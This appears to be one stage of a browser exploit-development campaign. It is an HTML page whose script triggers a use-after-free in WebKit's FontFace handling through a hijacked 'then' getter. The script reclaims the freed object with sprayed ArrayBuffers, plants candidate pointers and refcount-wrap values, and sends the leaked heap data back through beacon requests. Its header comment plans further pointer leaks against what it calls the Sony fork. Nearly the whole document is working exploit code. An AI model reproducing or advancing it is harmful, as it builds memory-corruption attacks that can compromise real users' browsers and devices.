<!--
  p690: heap-oracle v2 — variant+0x08 candidate queue (5 lanes/load)

  BASE: p688-wscan lineage (p676b-haze5 stable forge: clean corridor lanes
  0-4, haze st=4 lanes>=5, 24x192B spray/round, ROUNDS=8, ZERO LATE writes
  — law 6; seeds are spray-time only). ONE delta: the 5 corridor-lane
  candidates come from a PERSISTENT QUEUE so each load advances the scan.

  CANDIDATE RESOLUTION (per load, in priority order):
    1. localStorage 'p690q' = JSON array (numbers or "0x.." strings).
       If non-empty: shift up to 5 entries => lanes 0-4 (operator-directed
       mode; the queue shrinks and is persisted back — each load advances).
    2. DEFAULT T-band walk (queue empty): T from 'p686t' (persisted by the
       p686/p688 family; T-band = the freed face's clients-table region).
       Cursor in 'p690c', step 0x4000, window starts at T-0x8000 aligned
       down to 0x4000:
         lane0 = cursor, lane1 = cursor+0x4000, lane2 = cursor+0x8000,
         lane3 = 0x1  (DELIBERATE MISS CONTROL — near-null pointer),
         lane4 = shift from localStorage 'p690cands' JSON (external
                 candidate list; consumed one per load) or cursor+0x10000.
       Cursor advances 0xC000 per load and persists.

  RC-ARMOR (route variant /p690b, arm=1): when a lane's candidate came
  from the EXTERNAL list 'p690cands' (operator asserts P points inside OUR
  spray), seed rc=0xFFFFFFFF at lane+0x00 so the reclaim-time ref() makes
  rc 0x100000000->0 (wraps low, stays huge) — skips the lethal rc==2
  window (p674/p672 phenotype) and buys teardown-deref headroom.
  Default route /p690 = arm 0 (NO rc seed — pure candidate readback).

  SELF-LEAK PATH (documented for Monday's follow-up, NOT exercised here):
    Timer arm = 48B (Timer.h:47 virtual dtor + :138 m_function; face math
    0x90+0x30=0xC0). Face+0xB8 = m_function.m_callableWrapper -> heap
    CallableWrapper<std::_Bind<memfn,CSSFontFace*>>: vptr@+0x00,
    captured face-this @+0x08. A future oracle that lands a candidate ON a
    live timer's CallableWrapper block reads face-this at +0x08 — that is
    exactly the p690 seed/readback geometry (seed +0x08, DUMP readback):
    feed the wrapper's address via 'p690cands' once it is located.

  PRE-REGISTERED OUTCOMES (per load; judge from beacons P690-):
    hit ..... R0 stamped (T@+0x58 written by engine into a corridor lane):
              forge live; DUMP1 shows whether +0x08 survived per lane.
    miss .... R0 clean (no stamp): candidates did not divert reclaim;
              page continues (still emits later rounds).
    alive ... 'ALIVE end-r8-oralo2' beacon = page survived all 8 rounds.
    death ... load dies before ALIVE. PREDICTED CAUSE BY LANE SOURCE:
      (i) lane 0x1 (miss control): if the engine ever DEREFERENCES the
          variant as a pointer, death is IMMEDIATE (R0 window, near-null
          deref at P+small). If it never derefs (current model: variant is
          only memcpy'd/compared), 0x1 behaves as any miss => survival.
          THIS LANE IS THE DEREF-DISCRIMINATOR.
      (ii) T-band walk lanes: a walk candidate that lands inside a LIVE
           WebKit allocation and gets adopted => delayed R1/R2 death
           (clients-table walk / stale-ref teardown — p669 R2-killer
           family). Survival + unchanged +0x08 => band point inert.
      (iii) external 'p690cands' P inside our own spray, arm 0: predicted
           rc==2 lethal window at R1 (p674 phenotype: reclaim ok, then
           pre-R1 death). arm 1 (rc-armor): predicted SURVIVAL past R1 —
           armor working; if it still dies at R1 with armor, lethality is
           NOT refcount-shaped (pivot: Sony fork guard or timer fire).
  CHANNEL-VALIDITY NOTE: outcomes only count on loads where the forge
  itself is healthy (START + R0 hit/MISS beacons present). A death with
  ZERO beacons after START = early divert (treat as death cause (i) if
  lane3=0x1 was fresh in the queue, else re-run the load).

  Beacon: P690-.  CRASH_CLASS: MEDIUM.
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p690</title></head>
<body>p690: heap-oracle v2 (variant cands, queue/load, r8)
<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
<script>
(function() {
'use strict';

var L = document.getElementById('log');
var bQ = [];
function emit(tag, msg) {
  var s = tag + (msg ? ' ' + msg : '');
  L.textContent += s + '\n';
  bQ.push(s);
}
function flush() {
  while (bQ.length) {
    var b = bQ.splice(0, 2).join('|');
    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P690-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
  }
}
window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
function lsInt(k) {
  try { var v = parseInt(localStorage.getItem(k) || '0', 10); return isFinite(v) ? v : 0; } catch(e) { return 0; }
}
function lsJSON(k) {
  try { return JSON.parse(localStorage.getItem(k) || 'null'); } catch(e) { return null; }
}
function lsSet(k, v) { try { localStorage.setItem(k, v); } catch(e) {} }
function toNum(v) {
  if (typeof v === 'number' && isFinite(v) && v > 0) return v;
  if (typeof v === 'string') { var n = parseInt(v, 16); return (isFinite(n) && n > 0) ? n : 0; }
  return 0;
}

/* arm: /p690 = 0 (pure candidates), /p690b = 1 (rc-armor on ext lanes) */
var ARM = 0;
try { if (location.pathname.indexOf('p690b') !== -1) ARM = 1; } catch(e) {}

var TARGET = 1;
var T_PREV = lsInt('p686t');
var STEP = 0x4000;

/* ---- candidate resolution (queue > external list > T-band walk) ---- */
var CANDS = [0, 0, 0, 0, 0];
var EXT = [false, false, false, false, false];  /* lane fed from 'p690cands' */
var MODE = 'band';
(function resolveCands() {
  var q = lsJSON('p690q');
  if (q && q.length) {
    MODE = 'queue';
    for (var i = 0; i < 5 && q.length; i++) {
      var v = toNum(q.shift());
      if (v > 0) { CANDS[i] = v; EXT[i] = (i === 4); }  /* queue lane4 counts as directed/external for armor */
    }
    lsSet('p690q', JSON.stringify(q));
    return;
  }
  var cursor = lsInt('p690c');
  if (!cursor && T_PREV > 0) cursor = Math.max(0, T_PREV - 0x8000) & ~(STEP - 1);
  if (cursor > 0) {
    CANDS[0] = cursor;
    CANDS[1] = cursor + STEP;
    CANDS[2] = cursor + 2 * STEP;
    CANDS[3] = 1;                       /* deliberate miss control */
    var ext = lsJSON('p690cands');
    if (ext && ext.length) {
      var e = toNum(ext.shift());
      if (e > 0) { CANDS[4] = e; EXT[4] = true; }
      lsSet('p690cands', JSON.stringify(ext));
    }
    if (!CANDS[4]) CANDS[4] = cursor + 4 * STEP;
    lsSet('p690c', String(cursor + 3 * STEP));
  }
})();

emit('START', 'oralo2 r8 arm=' + ARM + ' mode=' + MODE +
     ' cur=' + lsInt('p690c').toString(16) +
     ' c=[' + CANDS.map(function(v) { return v.toString(16); }).join(',') + ']' +
     ' ext=[' + EXT.map(function(b) { return b ? '1' : '0'; }).join('') + ']');
flush();

var ROUNDS = 8;
var round = 0;
var results = [];
var gfired = -1;

var sty = null, ff = null;
var armed = false;
var spray = [];
window.__sprayAlive = [];
window.__facesAlive = [];
var snap1 = null;

var round0Lane = null;
var round0T = '';
var hitLanes = [];

function seedLane(dv, i) {
  /* round/lane-tagged float marker @+0x44 (data-only) */
  dv.setFloat32(0x44, 100 + round + i * 0.001, true);
  if (i < 5) {
    /* corridor: candidate P (64-bit LE) at variant +0x08 */
    if (CANDS[i] > 0) {
      dv.setUint32(0x08, (CANDS[i] % 4294967296) >>> 0, true);
      dv.setUint32(0x0C, Math.floor(CANDS[i] / 4294967296), true);
    }
    /* rc-armor (arm=1): external/directed candidates only — operator
       asserts P lives inside our spray; wrap keeps rc huge post-ref() */
    if (ARM === 1 && EXT[i]) dv.setUint32(0x00, 0xFFFFFFFF, true);
  }
  /* haze: st=4 at +0x82 on lanes >= 5 (p676b stable-forge pattern) */
  if (i >= 5) dv.setUint8(0x82, 4);
}

Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (!armed) return undefined;
    armed = false;
    gfired = round;
    try { sty.remove(); } catch(e) {}
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;
    spray = window.__sprayAlive[round] = [];
    for (var i = 0; i < 24; i++) {
      var ab = new ArrayBuffer(192);
      var dv = new DataView(ab);
      seedLane(dv, i);
      spray.push(dv);
    }
    return undefined;
  },
  set: function() {}
});

function dumpLane(dv) {
  var out = [];
  for (var off = 0; off <= 0xB8; off += 8) {
    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
  }
  return out.join(',');
}

function scanHit() {
  for (var i = 0; i < spray.length; i++) {
    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
  }
  return -1;
}

/* R0: dump ALL 5 corridor lanes (candidate survival readback @+0x08) */
function dump5() {
  var parts = [];
  for (var i = 0; i < 5 && i < spray.length; i++) {
    var d = dumpLane(spray[i]);
    if (d.length > 120) d = d.slice(0, 120);
    parts.push('L' + i + '=' + d);
  }
  return parts.join(';');
}

function groomMap() {
  for (var r = 0; r <= round && r < window.__sprayAlive.length; r++) {
    var lanes = window.__sprayAlive[r];
    if (!lanes) continue;
    for (var i = 0; i < lanes.length; i++) {
      var dv = lanes[i];
      var lo = dv.getUint32(0x58, true), hi = dv.getUint32(0x5C, true);
      if (lo !== 0 || hi !== 0) {
        emit('LANE r' + round, 'owner=r' + r + ' lane=' + i +
             ' seed=' + dv.getFloat32(0x44, true).toFixed(3) +
             ' T=' + hex32(hi) + hex32(lo) +
             ' rc=' + dv.getUint32(0x00, true) +
             ' st=' + dv.getUint8(0x82));
      }
    }
  }
}

function obsR0Lane() {
  if (!round0Lane) return;
  try {
    var tNow = hex32(round0Lane.getUint32(0x5C, true)) + hex32(round0Lane.getUint32(0x58, true));
    emit('OBS r' + round, 'opc=' + round0Lane.getUint32(0x60, true) +
         ' rc=' + round0Lane.getUint32(0x00, true) +
         ' st=' + round0Lane.getUint8(0x82) +
         ' Tsame=' + (tNow === round0T ? 'y' : 'n'));
  } catch(e) { emit('OBS r' + round, 'ERR ' + String(e).slice(0,60)); }
}

function trackHit(hit) {
  var dv = spray[hit];
  if (round === 0) round0Lane = dv;
  hitLanes.push({ tag: 'r' + round, dv: dv });
}

function beginRound() {
  sty = document.createElement('style');
  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
  document.head.appendChild(sty);
  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(ff);
  void ff.loaded;
  window.__facesAlive.push(ff);
  armed = true;
  document.fonts.load('1em f' + round + ', s' + round, 'AB');
  setTimeout(analyzeEarly, 150);
  setTimeout(analyzeLate, 3500);
}

function analyzeEarly() {
  try {
    obsR0Lane();
    var hit = scanHit();
    if (hit < 0) {
      emit('R' + round, 'MISS gf=' + gfired);
      results.push({ r: round, lane: -1, t: '-', w: '-' });
      if (round === 0) emit('R0DUMP1', dump5());
    } else {
      var dv = spray[hit];
      snap1 = dumpLane(dv);
      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
      if (round === 0) round0T = hex32(tHi) + hex32(tLo);
      trackHit(hit);
      emit('R' + round, 'hit=' + hit + (hit === TARGET ? ' TARGET' : ' NON-TARGET') +
           ' T=' + hex32(tHi) + hex32(tLo) +
           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
           ' gf=' + gfired +
           ' seed=' + dv.getFloat32(0x44, true).toFixed(3));
      if (round === 0) emit('R0DUMP1', dump5());
    }
    groomMap();
    flush();
  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
}

function analyzeLate() {
  try {
    obsR0Lane();
    var hit = scanHit();
    if (hit >= 0 && spray.length) {
      var dv = spray[hit];
      var snap2s = dumpLane(dv);
      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
           ' rc=' + dv.getUint32(0x00, true) +
           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
    } else {
      emit('R' + round + 'LATE', 'alive (miss-round)');
    }
    flush();
    round++;
    if (round < ROUNDS) {
      gfired = -1;
      setTimeout(beginRound, 250);
    } else {
      var ts = {}, lanes = [];
      for (var k = 0; k < results.length; k++) {
        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
        lanes.push(results[k].lane);
      }
      var keys = Object.keys(ts);
      emit('SUMMARY', 'oralo2 arm=' + ARM + ' mode=' + MODE +
           ' rounds=' + results.length + ' kept=' + window.__sprayAlive.length +
           ' distinctT=' + keys.length + ' lanes=[' + lanes.join(',') + ']');
      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
      emit('ALIVE', 'end-r8-oralo2-arm' + ARM);
      flush();
    }
  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
}

setTimeout(beginRound, 50);

})();
</script>
</body></html>
